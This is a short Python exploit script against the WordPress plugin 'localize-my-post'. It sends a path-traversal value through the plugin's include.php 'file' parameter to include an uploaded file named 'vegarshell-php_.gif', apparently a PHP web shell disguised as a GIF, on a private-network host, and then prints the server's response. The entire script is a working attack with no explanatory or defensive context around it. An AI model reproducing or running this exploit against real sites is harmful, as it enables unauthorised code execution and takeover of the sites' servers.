import requests

# Variables
server_url = '../../../../wp-content/uploads/vegarshell-php_.gif'

url = 'http://10.225.147.164/wp-content/plugins/localize-my-post/ajax/include.php?file=' + server_url


# Get request
r = requests.get(url)


# Print URL
print(r.url)
# Print text from file
print(r.text)
